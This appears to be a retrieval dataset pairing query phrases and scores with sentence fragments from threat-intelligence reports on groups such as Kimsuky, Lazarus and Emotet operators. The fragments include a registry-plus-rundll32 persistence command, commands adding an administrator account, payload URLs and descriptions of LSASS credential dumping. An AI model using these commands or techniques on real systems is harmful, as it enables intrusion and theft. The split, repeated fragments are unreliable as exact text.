Internete.g.', '443port GateWay Router/Firewall TCP Lateral movement Internal Server DMZ Email server etc.']"
The decoded payload|0.7552987011581582|['Its use in these debugging versions coincides with the samples for Mirage, which were written using Microsoft Visual C++.', 'CTU researchers also noted that the original name of the trojan used in the path is MirageFox, which is likely the name used by the threat actors.', 'This information leads to two potential conclusions: 1.', 'The two variants of MF-v1.2, the debug version and the release version, allow the threat actors to customize variants.', 'CTU researchers have already seen this activity.', '2.', 'The use of different drive letters but similar source code paths may indicate thatthe threat actors are keeping a repository of tools on a central file server for shared use.', 'Identification of victims From May to the date of this publication, the CTU research team engaged in a sinkhol- ing operation.', 'During the operation, several of the domains formerly used as part of the C2 infrastructure were taken over, and all activity to the domains was logged.', 'The sink- holed domains were no longer in use and were freely available for registration.', 'During the operation, CTU researchers were able to identify approximately 80 IP ad- dresses regularly communicating to the sinkhole.']
the API Web RESTful that provides access to Microsoft Cloud service resources.|0.8546577501505932|"['Similarly, the imported code dynamically calls VirtualAlloc to allocate a new region of memory in which a new PE file is copied.', 'Finally, it passes the execution to the region of memory in which the copied PE is allocated, as evidence reported following: The code in the injected PE creates another mutex having the name 42Htb600y.', 'The malware proceeds to de- obfuscate strings using a XOR loop and using a different XOR key for each string.', 'The following is an exhaustive list of de-obfuscated strings: DE-OBFUSCATED STRINGS \\\\\\\\.\\\\root\\\\CIMV2 SELECT UUID FROM Win32_ComputerSystemProduct ""WQL L""UUID ""Unknow n CLR L""pwrshplugin.dl l L""kernel32.dll ""RtlGetVersion ""RtlRandomEx ""RtlIntegerToUn icodeString ""RtlDecompressBuffer ""RtlGetCompressionWo rkSpaceSize ""RtlCompressBuffer ""RtlComputeCrc32 ""Windows 2000 ""Windows XP ""Windows XP P rofessional ""Windows Server 2003 ""Windows Home Server ""Windows Server 2003 R 2 ""Windows Vista ""Windows Serve r 2008 ""Windows Server 2008 R 2 ""Windows 7 ""Windows Se rver 2012 ""Windows 8 ""Windows Se rver 2016 ""Windows 10 ""Unidentified ""64bit ""32bit ""NtQue rySystemInformation ""GetCLRVersionForPSVersio n ""NtOpenThread ""NtAllocateVirtua lMemory ""Shell of task = %d ended with code = %d ""User-Agent: Mozilla/5.0 (Windows NT 10.0 ; WOW64; rv:87.0) Gecko/20210101 Firefox/87.0 ""User-Agent: ""chunked ""access_to ken ""refresh_token ""value ""file ""nam e ""/v1.0/d rive/root:/%s/update/%s:/content ""/v1.0/drive/root:/%s/check/%s:/content ""/v1.0/drive/root:/%s/check/%s ""/v1.0/drive/root:/%s/check:/chil dren ""/common/oauth2/v2.0/token ""login.microsoftonline.com"" ""graph.microsoft.com"" 3/6""Content-Type: application/json ""Content-Type: application/x-www-form-urlencoded ""Content-Type: application/octet-stream ""Content-Type: application/xml ""client_id=%s&redirect_uri=urn:ietf:wg:oauth:2.0:oob&refresh_token=%s&grant_type=refresh_token ""Authorization: bearer ""DELETE GET POST PUT L""ntdll.dll L""secur32.dll ""NtOpenKey ""NtQueryValueKey ""NtSetValueKey ""NtClose ""RtlInitUnicodeString ""RtlFreeUnicodeString L""\\\\\\\\Registry\\\\\\\\Machine\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Cryptography L""MachineGuid ""Accept: /"" ""Accept-Encoding: gzip, deflate ""User-Agent: Microsoft skyDriveSync %s ship L""\\\\\\\\Registry\\\\\\\\User\\\\\\\\%s\\\\\\\\Control Panel\\\\\\\\International\\\\\\\\User Profile L""Recharge ""RtlConvertSidToUnicodeString ""WTSQueryUserToken ""sprintf C&C COMMUNICATIONS The malware communicates with the Command and Control (C&C) through the domain graph[.]Microsoft[.', ']com, i.e.', 'abusing the Microsoft Graph service, which is the API Web RESTful that provides access to Microsoft Cloud service resources.', 'Hence, the analysis showed that the sample in question is a version of the Graphite malware, a malware using the Microsoft Graph API and OneDrive for C&C communications.', 'The malware is known to be deployed in- memory only and served as a downloader for the post-exploitation frameworks like Empire (as documented by Trellix researchers on early 2022 here).', 'To obtain a new OAuth2 token to access the service, the endpoint login[.]microsoftonline[.', ']com/common/oauth2/v2.0/token is contacted using a fixed client ID (62272a08-fe9d-4825- bc65-203842ff92bc), as evidence below: The following is the full HTTP request to make the first connection to the C&C.', 'HTTP REQUEST POST https://login.microsoftonline.com/common/oauth2/v2.0/token HTTP/1.1 User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64 ; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.507 Content-Type: application/x-www-form-urlencoded Host: login.microsoftonline.com Content-Length: 459 Connection: Keep-Al ive Cache-Control: no-cach e client_id=62272a08-fe9d- 4825-bc65- 203842ff92bc&redirect_uri=urn:ietf:wg :oauth:2.0:oob&refresh_token=M.R3_BAY.- CVmbPSAFzt2n5JiYAwjQRpC6Yh*f45Zsz9XKTHMo4G1ZeR0UDVRbJhp8T7Df*A Rh8tTfRKRZZ8YzFEYMRJ!VPP!GJPZsfeTb0SM Once obtained a new OAuth2 token, the Graphite malware will query the Microsoft GraphAPIs for new commands by enumerating the child files in the check OneDrive subdirectory.']"
The malware proceeds to de-obfuscate strings using a XOR loop|0.854023613439787|"['If the mutex doesnt already exists, the malware makes another request to OneDrive using the following URL: 2/6URL https[:]//kdmzlw[.]am[.]files[.]1drv[.', ']com/y4mv4glUgvW9nl8z8GU71PhPw0oRtve9QpZ0pEgwJN1q_TlGY5yl5Mvkrc5rUh0Uxxknlr1qy download"" A new file, again with a JPEG extension (DSC0001.jpeg), is downloaded and decrypted using the RSA and AES Cryptographic Provider from WinCrypt APIs, with a hardcoded public key.', 'Then, the malware dynamically calls the API NtAllocateVirtualMemory and then writes and executes the decrypted content in the newly allocated memory region.', 'Similarly, the imported code dynamically calls VirtualAlloc to allocate a new region of memory in which a new PE file is copied.', 'Finally, it passes the execution to the region of memory in which the copied PE is allocated, as evidence reported following: The code in the injected PE creates another mutex having the name 42Htb600y.', 'The malware proceeds to de- obfuscate strings using a XOR loop and using a different XOR key for each string.', 'The following is an exhaustive list of de-obfuscated strings: DE-OBFUSCATED STRINGS \\\\\\\\.\\\\root\\\\CIMV2 SELECT UUID FROM Win32_ComputerSystemProduct ""WQL L""UUID ""Unknow n CLR L""pwrshplugin.dl l L""kernel32.dll ""RtlGetVersion ""RtlRandomEx ""RtlIntegerToUn icodeString ""RtlDecompressBuffer ""RtlGetCompressionWo rkSpaceSize ""RtlCompressBuffer ""RtlComputeCrc32 ""Windows 2000 ""Windows XP ""Windows XP P rofessional ""Windows Server 2003 ""Windows Home Server ""Windows Server 2003 R 2 ""Windows Vista ""Windows Serve r 2008 ""Windows Server 2008 R 2 ""Windows 7 ""Windows Se rver 2012 ""Windows 8 ""Windows Se rver 2016 ""Windows 10 ""Unidentified ""64bit ""32bit ""NtQue rySystemInformation ""GetCLRVersionForPSVersio n ""NtOpenThread ""NtAllocateVirtua lMemory ""Shell of task = %d ended with code = %d ""User-Agent: Mozilla/5.0 (Windows NT 10.0 ; WOW64; rv:87.0) Gecko/20210101 Firefox/87.0 ""User-Agent: ""chunked ""access_to ken ""refresh_token ""value ""file ""nam e ""/v1.0/d rive/root:/%s/update/%s:/content ""/v1.0/drive/root:/%s/check/%s:/content ""/v1.0/drive/root:/%s/check/%s ""/v1.0/drive/root:/%s/check:/chil dren ""/common/oauth2/v2.0/token ""login.microsoftonline.com"" ""graph.microsoft.com"" 3/6""Content-Type: application/json ""Content-Type: application/x-www-form-urlencoded ""Content-Type: application/octet-stream ""Content-Type: application/xml ""client_id=%s&redirect_uri=urn:ietf:wg:oauth:2.0:oob&refresh_token=%s&grant_type=refresh_token ""Authorization: bearer ""DELETE GET POST PUT L""ntdll.dll L""secur32.dll ""NtOpenKey ""NtQueryValueKey ""NtSetValueKey ""NtClose ""RtlInitUnicodeString ""RtlFreeUnicodeString L""\\\\\\\\Registry\\\\\\\\Machine\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Cryptography L""MachineGuid ""Accept: /"" ""Accept-Encoding: gzip, deflate ""User-Agent: Microsoft skyDriveSync %s ship L""\\\\\\\\Registry\\\\\\\\User\\\\\\\\%s\\\\\\\\Control Panel\\\\\\\\International\\\\\\\\User Profile L""Recharge ""RtlConvertSidToUnicodeString ""WTSQueryUserToken ""sprintf C&C COMMUNICATIONS The malware communicates with the Command and Control (C&C) through the domain graph[.]Microsoft[.', ']com, i.e.', 'abusing the Microsoft Graph service, which is the API Web RESTful that provides access to Microsoft Cloud service resources.', 'Hence, the analysis showed that the sample in question is a version of the Graphite malware, a malware using the Microsoft Graph API and OneDrive for C&C communications.', 'The malware is known to be deployed in- memory only and served as a downloader for the post-exploitation frameworks like Empire (as documented by Trellix researchers on early 2022 here).']"
decrypted through an AES-256-CBCdecryption algorithm|0.8382297305873698|['Hence, the analysis showed that the sample in question is a version of the Graphite malware, a malware using the Microsoft Graph API and OneDrive for C&C communications.', 'The malware is known to be deployed in- memory only and served as a downloader for the post-exploitation frameworks like Empire (as documented by Trellix researchers on early 2022 here).', 'To obtain a new OAuth2 token to access the service, the endpoint login[.]microsoftonline[.', ']com/common/oauth2/v2.0/token is contacted using a fixed client ID (62272a08-fe9d-4825- bc65-203842ff92bc), as evidence below: The following is the full HTTP request to make the first connection to the C&C.', 'HTTP REQUEST POST https://login.microsoftonline.com/common/oauth2/v2.0/token HTTP/1.1 User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64 ; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.507 Content-Type: application/x-www-form-urlencoded Host: login.microsoftonline.com Content-Length: 459 Connection: Keep-Al ive Cache-Control: no-cach e client_id=62272a08-fe9d- 4825-bc65- 203842ff92bc&redirect_uri=urn:ietf:wg :oauth:2.0:oob&refresh_token=M.R3_BAY.- CVmbPSAFzt2n5JiYAwjQRpC6Yh*f45Zsz9XKTHMo4G1ZeR0UDVRbJhp8T7Df*A Rh8tTfRKRZZ8YzFEYMRJ!VPP!GJPZsfeTb0SM Once obtained a new OAuth2 token, the Graphite malware will query the Microsoft GraphAPIs for new commands by enumerating the child files in the check OneDrive subdirectory.', 'If a new file is found, the content is downloaded and decrypted through an AES-256-CBCdecryption algorithm.', 'The monitoring of task executions and the uploading of their results is managed through a dedicated thread.', 'Finally, the malware allows remote command execution by allocating a new region of memory and executing the received shellcode by calling a new dedicated thread.', 'CONCLUSIONS According to extracted metadata, attackers worked on the preparation of the campaign between January and February 2022.', 'However, both URLs used by the implant appared active even recently (Q3 2022).', 'According with the visibility we can dispose of, in addition, limited telemetry activities relating to this event were observed on 25/08/2022 and 09/09/2022 coming from two countries of the European Union (no data available before 25/08/2022).']
the imported code dynamically calls VirtualAlloc to allocate a new region of memory in which a new PE file is copied.|0.9586422081700747|"['The following syntax is responsible to perform the whole set of operations: COMMAND /c reg ADD HKCU\\\\Software\\\\Classes\\\\CLSID\\\\{2735412E-7F64-5B0F-8F00-5D77AFBE261E}\\\\InProcServer32 /t R EG_SZ /d C:\\\\ProgramData\\\\lmapi2.dll /ve /f /reg:64 && rundll32.exe C:\\\\ProgramData\\\\lmapi2.dll,#1 The DLL file lmapi2.dll is a 64-bit PE file with the compiler timestamp Mon Jan 17 08:10:01 2022 | UTC.', 'It creates a new thread, in which a new mutex is created with the name 56rd68kow.', 'If the mutex doesnt already exists, the malware makes another request to OneDrive using the following URL: 2/6URL https[:]//kdmzlw[.]am[.]files[.]1drv[.', ']com/y4mv4glUgvW9nl8z8GU71PhPw0oRtve9QpZ0pEgwJN1q_TlGY5yl5Mvkrc5rUh0Uxxknlr1qy download"" A new file, again with a JPEG extension (DSC0001.jpeg), is downloaded and decrypted using the RSA and AES Cryptographic Provider from WinCrypt APIs, with a hardcoded public key.', 'Then, the malware dynamically calls the API NtAllocateVirtualMemory and then writes and executes the decrypted content in the newly allocated memory region.', 'Similarly, the imported code dynamically calls VirtualAlloc to allocate a new region of memory in which a new PE file is copied.', 'Finally, it passes the execution to the region of memory in which the copied PE is allocated, as evidence reported following: The code in the injected PE creates another mutex having the name 42Htb600y.', 'The malware proceeds to de- obfuscate strings using a XOR loop and using a different XOR key for each string.', 'The following is an exhaustive list of de-obfuscated strings: DE-OBFUSCATED STRINGS \\\\\\\\.\\\\root\\\\CIMV2 SELECT UUID FROM Win32_ComputerSystemProduct ""WQL L""UUID ""Unknow n CLR L""pwrshplugin.dl l L""kernel32.dll ""RtlGetVersion ""RtlRandomEx ""RtlIntegerToUn icodeString ""RtlDecompressBuffer ""RtlGetCompressionWo rkSpaceSize ""RtlCompressBuffer ""RtlComputeCrc32 ""Windows 2000 ""Windows XP ""Windows XP P rofessional ""Windows Server 2003 ""Windows Home Server ""Windows Server 2003 R 2 ""Windows Vista ""Windows Serve r 2008 ""Windows Server 2008 R 2 ""Windows 7 ""Windows Se rver 2012 ""Windows 8 ""Windows Se rver 2016 ""Windows 10 ""Unidentified ""64bit ""32bit ""NtQue rySystemInformation ""GetCLRVersionForPSVersio n ""NtOpenThread ""NtAllocateVirtua lMemory ""Shell of task = %d ended with code = %d ""User-Agent: Mozilla/5.0 (Windows NT 10.0 ; WOW64; rv:87.0) Gecko/20210101 Firefox/87.0 ""User-Agent: ""chunked ""access_to ken ""refresh_token ""value ""file ""nam e ""/v1.0/d rive/root:/%s/update/%s:/content ""/v1.0/drive/root:/%s/check/%s:/content ""/v1.0/drive/root:/%s/check/%s ""/v1.0/drive/root:/%s/check:/chil dren ""/common/oauth2/v2.0/token ""login.microsoftonline.com"" ""graph.microsoft.com"" 3/6""Content-Type: application/json ""Content-Type: application/x-www-form-urlencoded ""Content-Type: application/octet-stream ""Content-Type: application/xml ""client_id=%s&redirect_uri=urn:ietf:wg:oauth:2.0:oob&refresh_token=%s&grant_type=refresh_token ""Authorization: bearer ""DELETE GET POST PUT L""ntdll.dll L""secur32.dll ""NtOpenKey ""NtQueryValueKey ""NtSetValueKey ""NtClose ""RtlInitUnicodeString ""RtlFreeUnicodeString L""\\\\\\\\Registry\\\\\\\\Machine\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Cryptography L""MachineGuid ""Accept: /"" ""Accept-Encoding: gzip, deflate ""User-Agent: Microsoft skyDriveSync %s ship L""\\\\\\\\Registry\\\\\\\\User\\\\\\\\%s\\\\\\\\Control Panel\\\\\\\\International\\\\\\\\User Profile L""Recharge ""RtlConvertSidToUnicodeString ""WTSQueryUserToken ""sprintf C&C COMMUNICATIONS The malware communicates with the Command and Control (C&C) through the domain graph[.]Microsoft[.', ']com, i.e.', 'abusing the Microsoft Graph service, which is the API Web RESTful that provides access to Microsoft Cloud service resources.']"
The BAT script|0.9847423372450563|"['4 GUID is a unique reference number.', 'Its a 128-bit value that is unique not only within an enterprise but also worldwide.', 'Active Directory internally uses GUID to identify objects.', '24 | The Spy Kittens Are Back: Rocket Kitten 2 The second line deletes the script in an attempt to hide the infection.', 'The file, NTUSER.dat{GUID}.exe (SHA-1: 64ba130e627dd85c85d6534e769d239080e068dd, detected by Trend Micro as BKDR_SWRORT.CP) has been dropped prior to launching the tmp.', 'bat script.', 'BKDR_SWRORT.CP is a small downloader that communicates with and downloads files from the IP address, 84.11.146.62.', 'This IP address belongs to an IABG IP range (http://www.iabg.de/), a German satellite communications provider that the attackers have been using for a long time.', '25 | The Spy Kittens Are Back: Rocket Kitten 2ConclusionConclusion The Rocket Kitten Group has been around for a while now.', 'Based on research done by several security companies, including Trend Micro and ClearSky, we can assume that their activities will continue in the near future, as they werent deterred by making their existence and attack methods known.', 'Weve been observing the group for about a year now.']"
The BAT script|0.7932012050125563|[]
The BAT script|0.7932012050125563|['.', '.', '.', '.', '.', '5 The Bat!', '.', '.', '.', '.', '.']
The BAT script|0.7892807218169466|['Static information of DLL are shown below: Hash caa24c46089c8953b2a5465457a6c202ecfa83ab bce7a9d3299ade52ec8382c2 Threat Kimsuky second stage Brief DLL used by the Kimsuky group as second stage Description Ssdeep 6144:6lhe64TNUalJMRRfS5mABlakVxOfLnePfcNl6GwUDuL/:6zfeCk IAYfLeXcj6uuL Table 2: AutoUpdate.dll Information The dll is then copied into the folder %AppData%\\\\Roaming\\\\Microsoft\\\\Windows\\\\Defender\\\\ and it is renamed into AutoUpdate.dll.', 'https://blog.yoroi.company/research/the-north-korean-kimsuky-apt-keeps-threatening-south-korea-evolving-its-ttps/ 2/123/4/2020 The North Korean Kimsuky APT keeps threatening South Korea evolving its TTPs Yoroi Blog The AutoUpdate.dll library then gains persistence by setting the following registry key HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\\\WindowsDefender.', 'The name and the path used by the attacker is absolutely tricky, because they reference to Windows Defender: Figure 3: registry key set for persistence .', 'Furthermore, exploring the content of the folder %AppData%\\\\Local\\\\Temp path, we observed another temporary file created and immediately removed dubbed <random_name>.tmp.bat.', 'By analyzing its contents, we noticed that it is used to delete the initial artifact (scr) and file itself.', 'Figure 4: Content of the bat script.', 'In order to hide the malicious operation and avoid raising suspicion, a legit document is created in the same folder containing the .scr file, the document is named .hwp.', 'Translating its name from Korean to English language, is possible to obtain the CV Form string.', 'The name and other information about the document are the following: Hash d21523b7b8f6584305a0a6a83cd65c8ce0777a42ab781c35aa06c46c91f504b4 Threat Kimsuky legit document Brief Legit document used to divert attention on the malware in hwp extension De scrip tion Ss 192:zXEKVs7kRvm+1FsO2ui/VpIkCnH5QVSV9VahhU:r3YkA+1aJuk deep WQVS9avU Table 3: Information about legit document with .hwp extension As implied by the file name (CV Form), the document contains a CV form with empty fields, as shown in the following figure.', 'https://blog.yoroi.company/research/the-north-korean-kimsuky-apt-keeps-threatening-south-korea-evolving-its-ttps/ 3/123/4/2020 The North Korean Kimsuky APT keeps threatening South Korea evolving its TTPs Yoroi Blog Figure 6: Legit document overview Bypassing AV Detection An interesting behaviour is the explorer.exe injection performed by the AutoUpdate.dll in order to avoid AVs detection.', 'Digging in the malicious code, it is possible to see the methods used to perform this operation.']
The BAT script|0.7738770072797273|['The following commands show the basic network and domain information of the environment that has the infected system.', 'The collected information can be used later in lateral movement attacks.', 'If the attack succeeds, the attacker can dominate the systems within the domain.cmd.exe /c ping 11.11.11.1cmd.exe /c ipconfig /allcmd.exe /c query usercmd.exe net group domain admins /domainnet user _smuser white1234!', '@#$cmd.exe net localgroup administrators /add smi140199Jin MinerAnalyzing the ASD log for the infected system shows that before the Lazarus group installed NukeSped, other attackers had already exploited the vulnerability to install Jin Miner.', 'Jin Miner is known as a malware strain distributed through the Log4Shell vulnerability, as shown in theprevious Sophos report.Installed in the path shown above through the powershell command, Jin Miner is a CoinMiner that ultimately mines the Monero coin.MD5131fc4375971af391b459de33f81c2531875f6a68f70bee316c8a6eda9ebf8de47791bf9e017e3001ddc68a7351ca2d67a19c59c4373cadb4556f7e30ddd91ac7ef97450e84211f9f35d45e1e6ae1481URLhttp[:]//185[.]29[.]8[.]18/htroy[.]exehttp[:]//185[.]29[.]8[.]18[:]8888/http[:]//84[.]38[.]133[.]145[:]443/http[:]//84[.]38[.]133[.]16[:]8443/http[:]//iosk[.]org/pms/add[.', ']bat']
take screenshots|1.0|['Ability to keep memory artifacts hidden from EDRs and AV.', 'Direct Windows SYS calls on the fly.', 'Egress over HTTP, HTTPS, DNS Over HTTPS, SMB and TCP.', 'LDAP Sentinel provides a rich GUI interface to query various LDAP queries to the domain or a forest.', 'Multiple command and control channels multiple pivot options such as SMB, TCP, WMI, WinRM and managing remote services over RPC.', 'Take screenshots.', 'x64 shellcode loader.', 'Reflective and object file loader.', 'Decoding KRB5 ticket and converting it to hashcat.', 'Patching Event Tracing for Windows (ETW).', 'Patching Anti Malware Scan Interface (AMSI).']
take screenshots|0.7542935086937963|"['It particularly targets Google Chrome.', 'Enables a Socks5 reverse proxy server in the infected machine via the open source project tsocks.', '14/19Persistence is achieved by creating a new LNK file in the startup folder ""\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\WINN.lnk"".', 'Exfiltrate files to the remote server via web sockets.', 'Run custom VBS scripts in the infected machine.', ""Take screenshots from the victim's machine."", 'Generate remote shell sessions.', 'All these capabilities in addition to the very low detection rate of the payload, which during this investigation, has remained close to zero even after 3 months of its first report (see image below), are the perfect recipe for the success of this threat actor.', 'We are currently tracking this tool as the IceBreaker Backdoor, and we continue researching it to help community understand, identify and effectively respond against this new threat.', ""Conclusions For the past several months we've been tracking a new threat we call IceBreaker APT which targets the gaming/gambling industry."", 'The threat appeared just a few months before the largest gaming/gambling conference in the world, ICE London, hence we decided to give it that name.']"
take screenshots|0.892075886711548|"[""Keylogger Keylogger stores keystrokes to the following file: %TEMP%\\\\log%d.txt Here is a sample of malware key-log output: (((((((Hello new File))))))))) +++++++++++++ Window= VMware Accelerated AMD PCNet Adapter (Microsoft's Packet Scheduler) : Capturing - Wireshark +++++++++++++ [UP][DOWN][DOWN][UP][UP][DOWN][UP][DOWN][DOWN][UP][UP][DOWN][DOWN][DOWN][UP][UP][UP][UP] [DOWN][DOWN][DOWN][DOWN]r +++++++++++++ Window= Run +++++++++++++ cmd[ENTER] +++++++++++++ Window= C:\\\\WINDOWS\\\\system32\\\\cmd.exe +++++++++++++ notepad[ENTER] +++++++++++++ Window= VMware Accelerated AMD PCNet Adapter (Microsoft's Packet Scheduler) : Capturing - Wireshark +++++++++++++ [DOWN][UP] +++++++++++++ Window= Untitled - Notepad +++++++++++++ test test test +++++++++++++ 2015 Check Point Software Technologies Ltd. All rights reserved | 34This file will be sent to remote C&C server later on."", 'If the malware detects an open Gmail, Yahoo or Outlook window, it will add special processing so the attacker can easily recognize the data that is the most valuable to him.', 'The following string will be appended to the output file: \\\\r/////////////\\\\r\\\\nMail Find Webcam capture The malware may capture photos from an attached webcam.', 'Files are first saved with the name test.bmp, later converted to JPEG and saved under the new file name Cam.jpg, eventually exfiltrated to the C&C server.', 'TCP Connection Table The malware will gather available metadata regarding current TCP connections using the GetTcpTable API, and send a formatted version of the obtained data to the C&C server.', 'Screenshots The malware may take screenshots.', 'The filename used for screenshots is Screeny.jpeg.', 'Remote Shell (Live Command Execution) The malware creates the following process as a live command prompt: cmd.exe /c cmd.exe This process output and input are attached and redirected via pipes to the remote C&C server, allowing the operator to type in commands to control the victim computer.', 'The following line is first sent to the server: Welcome To mpkshell Command Line (This Message Send From Server) Traffic Monitoring The malware may sniff all TCP and UDP traffic on the machine.', 'This is achieved through the use of RAW sockets.', 'The following status strings can be sent to the C&C server: Initializing Winsock 2.2...']"
take screenshots|0.7716093549780308|['Figure 13: Decoded data of 15882060891.jpg Below figure shows contents of hxxp://www[.]m9c[.]net/uploads/15882060892.jpg.', 'It is the encoded data of the final payload.', 'https://www.seqrite.com/blog/gorgon-apt-targeting-msme-sector-in-india/ 9/128/12/2020 Gorgon APT targeting MSME sector in India Figure 14: Contents of 15882060892.jpg Final Payload Agent Tesla: Below figure shows injected Agent Tesla payload in RegAsm.exe.', 'Figure 15: Injected payload Agent Tesla is a well-known keylogger and infostealer written in DotNet.', 'This malware steals information from a variety of applications like Web Browsers, Email Clients, FTP Clients, Messenger applications, VPN clients, etc.', 'and can also take screenshots of the system.', 'All stolen data is exfiltrated over SMTP.', 'https://www.seqrite.com/blog/gorgon-apt-targeting-msme-sector-in-india/ 10/128/12/2020 Gorgon APT targeting MSME sector in India We have already explored and analysed Agent Tesla in our last couple of blogs: https://www.seqrite.com/blog/advance-campaign-targeting-manufacturing-and-export- sectors-in-india/ https://www.seqrite.com/blog/coronavirus-themed-campaign/ Conclusion Most TTPs shared above, have been seen on several occasions in the last few years.', 'Looking at malware, C2 and technique execution, Quick Heal correlates this campaign on MSME sector to Gorgon group [a.k.a.', 'Subaat].', 'All members of the Gorgon cyber-criminal group purport to have Pakistan-based interests/connections.']
take screenshots|1.0|['All the modules we observed contain shared code responsible for: Encrypting the data.', 'Exfiltrating gathered data through a POST request or by uploading it to an FTP server.', 'Sending execution logs to a remote server.', 'In addition to this, each module performs some specific job.', 'We managed to retrieve and analyze the next modules: List installed applications.', 'Take screenshots.', '4/14List running processes.', 'Get OS and computer information.', 'Execute a predefined command from the C&C.', 'Clean up any traces created by different modules.', 'Applications Module This module uses two methods to fetch installed applications.']
take screenshots|0.8813012751957298|['Enumerate Drives.6.', 'Enumerate Processes by ID, Name, or Privileges.7.', 'Start and Stop Processes.8.', 'Enumerate Files and Directories.9.', 'Open a Named Pipe and Send and Receive Data.10.', 'Take Screenshots.11.', 'Inject into User Processes.12.', 'Enumerate Services.13.', 'Start/Stop Services.14.', 'Modify the Registry.15.', 'Open/Close TCP and UDP Sessions.--- End Program Capabilities ---The program will also look for the following paths: \\\\SetupUi, \\\\AppIni, and \\\\ExtInfo.']
then proceeded to dump credentials from LSASS.|0.8638810226764747|['Using the Cobalt Strike beacon, the threat actors began conducting a new round of discovery activity.', 'Windows net commands were run, targeting domain groups and computers, nltest was executed again, and they also used tasklist and ping to investigate a remote host.The threat actor then moved laterally to a workstation.', 'They first attempted this action using a PowerShell beacon and a remote service on the host, but while the script did execute on the remote host, it appeared to fail to connect to the command and control server.', 'Next, they proceeded to transfer a beacon executable over SMB to the remote hosts ProgramData directory.', 'This beacon was then successfully executed via WMI and connected successfully to the threat actors server.Once on this new host the threat actors proceeded to run the net commands to review the Domain Administrators group again.', 'They then proceeded to dump credentials from the LSASS process on the host.', 'With some further process injection they then began to enumerate SMB shares across the environment and on finding a primary file server reviewed several documents present on the server.', 'This Cobalt Strike server stopped communicating shortly there after.On the fourth day of the intrusion, Emotet dropped a new Cobalt Strike beacon.', 'Again, some net command discovery was run for domain admins and domain controller servers.', 'A flight of netlogon authentications were observed from the beachhead host to the domain controller as a possible attempt at exploiting the domain controller.The threat actors, however, proceeded along a more traditional path, using SMB file transfers and remote services to move laterally across domain controllers and several other servers in the environment using Cobalt Strike beacon DLLs.', 'On the domain controller, the threat actors conducted further discovery tasks runningfind.batandp.bat, which executed AdFind active directory discovery and performed a ping sweep across the environment.On one of the other targeted servers, the threat actors deployed Tactical RMM, a remote management agent, for additional access and persistence in the environment.']
the threat actors again used Get-System to elevate and then dumped LSASS.|0.8736129014703597|['This was achieved by transferring a Cobalt Strike DLL over SMB and executing via a remote service on another workstation.', 'From there, they ran Invoke-Sharefinder once again, along with AdFind, using a batch file named find.bat.', 'Pass-the-Hash behavior was observed targeting several accounts on the lateral host.', 'Use of Cobalt Strikes Get-System module was also apparent via the logs.The threat actors then proceeded to do additional network discovery using a batch script named p.bat to ping all servers in the network.', 'More account discovery was then observed, with queries for Domain Administrators and a backup account.At 31 hours into the intrusion, the threat actors pivoted to the Domain Controller using the same Cobalt Strike DLL.', 'Once on the Domain Controller, the threat actors again used Get-System to elevate and then dumped LSASS.', 'After completing that activity, the threat actors chose another server to push a file, 1.msi, to, which was the installation package for Aterafor an additional means of persistence and command and control.', 'During this whole second day, the original Emotet infection on the beachhead host was still trying to send more malicious emails, finally stopping for the day a little before 23:00 UTC.They returned the next day, at the same time as the previous day, and picked up where they left off.', 'They pivoted to a couple of workstations on the network using Cobalt Strike and installed Atera and Splashtop with a different MSI installer.', 'Once again, they executed Invoke-Sharefinder, AdFind, and the p.bat batch script to ping online servers.', 'Using the remote admin tools, they used Rclone to exfiltrate important data from a file server and upload it to MEGA.']
This was achieved by transferring a Cobalt Strike DLL over SMB|0.7798612606302306|['This entailed connecting to various email servers and sending new emails with attached xls and zip files.', 'This activity continued until the UTC clock turned over to the next day; at which point, the email spreader halted for a period of time and around seven hours into the second day, it began running the email spreader again.Around 26 hours after the initial infection, while still running the email spreader, the Emotet malware pulled down and executed a Cobalt Strike payload on the beachhead host.', 'Right after the beacon was executed, the threat actors began enumerating the network using native Windows binaries and the PowerView module, Invoke-ShareFinder.', 'Around 30 minutes after dropping the beacon the threat actor injected into a dllhost.exe process and then proceeded to dump credentials from LSASS.', 'Another 20 minutes later, the threat actor ran Invoke-ShareFinder again and Invoke-Kerberoast.At 29 hours from initial access, the threat actors began their first lateral movement.', 'This was achieved by transferring a Cobalt Strike DLL over SMB and executing via a remote service on another workstation.', 'From there, they ran Invoke-Sharefinder once again, along with AdFind, using a batch file named find.bat.', 'Pass-the-Hash behavior was observed targeting several accounts on the lateral host.', 'Use of Cobalt Strikes Get-System module was also apparent via the logs.The threat actors then proceeded to do additional network discovery using a batch script named p.bat to ping all servers in the network.', 'More account discovery was then observed, with queries for Domain Administrators and a backup account.At 31 hours into the intrusion, the threat actors pivoted to the Domain Controller using the same Cobalt Strike DLL.', 'Once on the Domain Controller, the threat actors again used Get-System to elevate and then dumped LSASS.']
using a batch file named find.bat.|0.76130894172955|"['3.', 'OilRig (Iran) - OilRig is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014.', 'The group has targeted a variety of sectors, including financial, government, energy, chemical, and telecommunications.', '4.', 'Sandman (China) - Sandman APT is likely associated with suspected China-based threat clusters known to use the KEYPLUG backdoor, in particular a cluster jointly presented by PwC and Microsoft at Labscon 2023 STORM-0866/Red Dev 40.', '5.', 'Arid Viper (Palestine) - Arid Viper is an espionage-motivated cyber threat actor with Hamas- aligned interests.', ""Arid Viper's toolkit is multi-platform and includes the consistent use and develop- ment of mobile spyware since emerging in 2017."", 'Increased industry focus on Arid Viper is an extension of our continuing collective efforts to track threat actors engaged in the Israel-Hamas war.', 'SENTINELONE WATCHTOWER END OF YEAR 2023 18Top Threats of 2023 by Operating System Windows There was no reduction in Windows malware and loaders in 2023.', ""Many commodity loaders were poly- morphic (change their hash on every execution) and supported attackers' hands-on-keyboard activities for information gathering, disabling security settings, and forging the way for ransomware attacks.""]"
